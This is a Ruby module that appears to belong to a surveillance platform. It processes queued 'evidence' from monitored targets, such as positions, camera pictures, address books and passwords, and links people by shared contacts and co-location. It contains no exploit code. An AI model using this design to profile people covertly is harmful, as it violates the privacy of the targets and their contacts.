#
# Intelligence processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

require_relative 'accounts'
require_relative 'camera'
require_relative 'position'
require_relative 'ghost'

module RCS
module Intelligence

class Processor
  extend RCS::Tracer

  def self.run
    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = IntelligenceQueue.get_queued)
        entry = queued.first
        count = queued.last
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    entity = entry.related_entity

    case entry.type
      when :evidence
        evidence = entry.related_item
        trace :info, "Processing evidence #{evidence.type} for entity #{entity.name}"
        process_evidence(entity, evidence)

      when :aggregate
        aggregate = entry.related_item
        trace :info, "Processing aggregte for entity #{entity.name}"
        process_aggregate(entity, aggregate)
    end

  rescue Exception => e
    trace :error, "Cannot process intelligence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.process_evidence(entity, evidence)
    case evidence.type
      when 'position'
        # save the last position of the entity
        Position.save_last_position(entity, evidence)
      when 'camera'
        # save picture of the target
        Camera.save_first_camera(entity, evidence)
      when 'addressbook'
        # analyze the accounts
        Accounts.add_handle(entity, evidence)
        # create a ghost entity and link it as :know
        Ghost.create_and_link_entity(entity, Accounts.get_addressbook_handle(evidence)) if check_intelligence_license
      when 'password'
        # analyze the accounts
        Accounts.add_handle(entity, evidence)
    end
  end

  def self.check_intelligence_license
    LicenseManager.instance.check :intelligence
  end

  def self.compatible_entity_handle_types aggregate_type
    if [:call, :sms, :mms].include? aggregate_type
      ['phone']
    elsif [:mail, :gmail].include? aggregate_type
      ['mail', 'gmail']
    else
      [aggregate_type.to_s]
    end
  end

  # Process the aggregate and (eventually) link the entities
  def self.process_aggregate entity, aggregate
    if aggregate.type == :position
      process_position_aggregate entity, aggregate
    else
      process_peer_aggregate entity, aggregate
    end
  end

  def self.process_peer_aggregate entity, aggregate
    # normalize the type to search for the correct account
    aggregate_type = aggregate.type
    types = compatible_entity_handle_types aggregate_type

    # As the version 9.0.0 the aggregate has a "sender" key that contains the handle of the other peer
    # involved in a communication. The "sender" is an handle of the current entity (the one under surveillance)
    if aggregate.data['sender']
      entity.create_or_update_handle types.first, aggregate.data['sender']
    end

    # search for existing entity with that account and link it (direct link)
    if (peer = Entity.same_path_of(entity).where("handles.handle" => aggregate.data['peer']).in("handles.type" => types).first)
      info = "#{aggregate.data['sender']} #{aggregate.data['peer']}".strip
      RCS::DB::LinkManager.instance.add_link(from: entity, to: peer, level: :automatic, type: :peer, versus: aggregate.data['versus'].to_sym, info: info)
      return
    end

    # search if two entities are communicating with a third party and link them (indirect link)
    ::Entity.targets.same_path_of(entity).each do |e|

      trace :debug, "Checking if '#{entity.name}' and '#{e.name}' have common peer: #{aggregate.data['peer']} #{types}"

      next unless Aggregate.target(e.path.last).summary_include?(aggregate_type, aggregate.data['peer'])

      trace :debug, "Peer found, creating new entity... #{aggregate.data['peer']} #{types}"

      # create the new entity
      name = Entity.name_from_handle(aggregate_type, aggregate.data['peer'], e.path.last)
      name ||= aggregate.data['peer']
      ghost = Entity.create!(name: name, type: :person, level: :automatic, path: [entity.path.first])

      # the entities will be linked on callback
      ghost.handles.create!(level: :automatic, type: aggregate_type, handle: aggregate.data['peer'])
    end
  end

  def self.process_position_aggregate entity, aggregate
    position = aggregate.position
    position_ary = [position[:longitude], position[:latitude]]
    day = Time.parse aggregate.day
    days_around = [day-1.day, day, day+1.day]

    operation_id = entity.path.first

    # 2 entities have been in the same place at the same time:
    # create a position entity an link the 2 entities with it
    ::Entity.targets.same_path_of(entity).each do |other_entity|
      Aggregate.target(other_entity.target_id).in(day: days_around).positions_within(position).each do |ag|
        next unless aggregate.timeframe_intersect?(ag)

        # search for similar positions
        position_entity = ::Entity.path_include(operation_id).positions_within(position).first
        unless position_entity
          position_entity = Entity.new type: :position, path: [operation_id], position: position_ary
        end
        position_entity.update_attributes! level: :automatic
        name = "Position #{position_ary.reverse.join(', ')}"
        position_entity.update_attributes!(name: name) if position_entity.name.blank?

        # TODO - add the timeframe to the "info" array
        # TODO - versus :both??
        # TODO - move this logic in a create_callback of Entity (type position)
        link_params = {level: :automatic, type: :position, versus: :both, to: position_entity, info: nil}
        RCS::DB::LinkManager.instance.add_link link_params.merge(from: entity)
        RCS::DB::LinkManager.instance.add_link link_params.merge(from: other_entity)
      end
    end
  end
end

end #OCR::
end #RCS::
